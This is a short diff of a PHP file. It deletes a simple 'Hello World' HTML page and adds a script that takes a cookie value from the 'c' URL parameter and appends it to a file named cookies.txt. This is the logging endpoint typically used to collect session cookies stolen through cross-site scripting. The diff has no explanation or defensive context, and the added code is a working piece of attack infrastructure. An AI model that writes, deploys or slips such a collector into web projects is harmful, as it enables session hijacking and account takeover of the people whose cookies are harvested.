@@ -1,13 +1,6 @@
-<!DOCTYPE html>
-<html>
-<body>
-
 <?php
-
-if ("10" < "20") {
-    echo "How can I not to say Hello World!";
-}
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
 ?>
-
-</body>
-</html>
